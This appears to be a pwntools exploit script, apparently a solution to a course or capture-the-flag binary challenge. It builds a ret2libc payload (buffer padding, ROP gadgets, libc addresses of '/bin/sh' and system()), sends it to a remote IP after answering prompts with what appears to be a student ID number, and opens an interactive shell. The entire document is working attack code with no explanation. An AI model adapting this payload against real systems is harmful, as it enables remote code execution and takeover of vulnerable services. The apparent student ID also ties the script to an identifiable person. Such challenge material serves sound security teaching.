from pwn import *

offset = 48

libc = ELF("libc.so.6")
libc_base = 0x7FFFF7D90000

# libc = 0x00007ffff7d9c000 ini lokal
ret = 0x40101A
pop_rdi = 0x40151C
bin_sh = libc_base + next(libc.search(b"/bin/sh"))  # Alamat runtime /bin/sh
system = libc_base + libc.symbols["system"]  # Alamat runtime system
# Info
info("Ret: %s", hex(ret))
info("Pop rdi: %s", hex(pop_rdi))
info("bin_sh: %s", hex(bin_sh))
info("system: %s", hex(system))


# Susun payload
payload = b"A" * offset
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

decoded_payload = "".join(f"\\x{byte:02x}" for byte in payload)

print(decoded_payload)
# Kirim payload
p = remote("52.184.85.16", 12345, level="debug")

# Tunggu prompt dan kirim NIM
p.recvuntil(b"NIM: ")
p.sendline(b"13523051")
    
# Tunggu prompt berikutnya dan kirim Challenge number
p.recvuntil(b"Challenge: ")
p.sendline(b"7")
p.sendline(payload)
p.interactive()